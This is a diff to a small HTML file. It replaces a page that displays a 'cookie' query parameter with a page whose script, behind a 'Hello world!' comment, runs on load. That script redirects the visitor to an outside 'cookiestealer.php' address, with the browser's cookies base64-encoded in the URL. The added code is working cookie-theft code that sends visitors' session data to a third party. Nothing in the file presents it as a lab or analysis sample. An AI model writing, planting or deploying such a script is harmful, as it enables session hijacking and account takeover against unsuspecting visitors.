@@ -1,28 +1,8 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Cookie Logger</title>
-</head>
-<body>
-    <h1>Cookie Logger</h1>
-    <p id="log">Loading...</p>
-    <script>
-        window.onload = function() {
-            try {
-                var params = new URLSearchParams(window.location.search);
-                var cookieData = params.get('cookie');
-
-                if (cookieData) {
-                    console.log('Logged Cookie:', cookieData);
-                    document.getElementById('log').textContent = 'Logged Cookie: ' + decodeURIComponent(cookieData);
-                } else {
-                    document.getElementById('log').textContent = 'No cookie data found.';
-                }
-            } catch (error) {
-                console.error('Error processing the cookie data:', error);
-            }
-        };
-    </script>
-</body>
+<html>
+	<body>
+		<!-- Hello world! -->
+		<script type="text/javascript">
+			document.location='https://kirblol.github.io/cookiestealer.php?c='+encodeURIComponent(btoa(document.cookie));
+		</script>
+	</body>
 </html>
